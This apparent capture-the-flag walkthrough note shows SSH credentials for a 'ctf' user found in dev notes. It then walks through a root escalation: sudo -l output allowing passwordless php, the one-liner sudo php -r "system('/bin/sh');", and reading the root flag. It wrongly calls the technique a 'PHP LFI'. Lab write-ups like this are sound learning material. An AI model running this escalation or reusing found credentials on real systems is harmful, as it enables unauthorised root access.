---
dg-publish: true
---
Found Dev Notes:
![[Dev Notes.png]]

URL Goes to Admin Upload Portal

Development credentials - REMOVE BEFORE PROD SSH user: ctf SSH pass: nO2gh5aWgwmVqax6z9hjYesbGAQlSceueZPa8t5XUYGQbTz8Lm

To Find Root
- 1) Use Sudo -l to check permissions for CTF user after SSH
```
Matching Defaults entries for ctf on ip-10-0-3-67:
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ctf:
Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User ctf may run the following commands on ip-10-0-3-67:
(ALL) NOPASSWD: /bin/ls, /usr/bin/file, /usr/bin/php
```

- 2) /usr/bin/php is the path we can exploit with a PHP LFI
	- PHP One Liner - `sudo php -r "system('/bin/sh');"`
	- Result - `whoami root - Escalated
- 3) Locate root flag
```
cd /root
ls
flag-root.txt
cat flag-root.txt
```

	  
	